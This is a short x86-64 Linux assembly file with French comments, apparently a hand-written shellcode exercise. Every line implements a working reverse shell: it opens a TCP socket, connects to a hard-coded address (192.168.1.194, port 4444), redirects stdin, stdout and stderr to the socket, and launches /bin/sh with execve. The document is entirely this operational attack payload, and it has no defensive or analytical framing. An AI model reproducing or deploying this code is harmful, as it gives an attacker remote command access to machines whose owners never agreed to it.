BITS 64

global _start

section .text
_start:

;socket parametre : inet : IPv4, sock stream = 1, 0
mov rax, 0x29   ; syscall socket
mov rdi, 2      ; AF_INET (IPv4)
mov rsi, 1      ; sock stream pour tcp
mov rdx, 0      ; protocol = 0 (kernel choisit)
syscall

mov r12, rax    ; sauvegarde dans r12 pour eviter l'ecrasement des autres syscall 

; sockaddr_in : family(2) + port(4444) + ip + padding
; en little-endian 64 bits : 02 00 5c 11 c0 a8 01 c2
xor rbx, rbx
push rbx ; padding
mov rbx, 0xc201a8c05c110002
push rbx ; family + port + ip
mov rsi, rsp ; rsi pointe sur le sockaddr_in

;connect
mov rax, 0x2a   ; syscall connect
mov rdi, r12    ; récuperation du sockfd depuis r12 
mov rdx, 16     ; octet à lire par le noyau
syscall

;dup2 stdin, stdout, stderr

;stdin
mov rax, 0x21
mov rdi, r12   ; connexion au socket
xor rsi, rsi   ; stdin : rsi = 0
syscall

;stdout
mov rax, 0x21
mov rdi, r12    ; connexion au socket
mov rsi, 1      ; stdout : rsi = 1
syscall

;stderr
mov rax, 0x21
mov rdi, r12    ; oldfd connexion au socket
mov rsi, 2      ; stderr : rsi = 2 (newfd)
syscall

;execve : /bin/sh, (/bin/sh,null), null
xor rdx,rdx     ; envp = 0 pas de variable d'environnement
push rdx        ; null qui determine le tableau argv[]
mov rbx, 0x68732f6e69622f   ; /bin/sh en little indian tjr 
push rbx        
mov rdi, rsp    ; rdi = /bin/sh
push rdx        ; argv[1] = null
push rdi        ; argv[0] = /bin/sh
mov rsi, rsp    ; rsi = argv 
mov rax, 0x3b   ; syscall execve
syscall
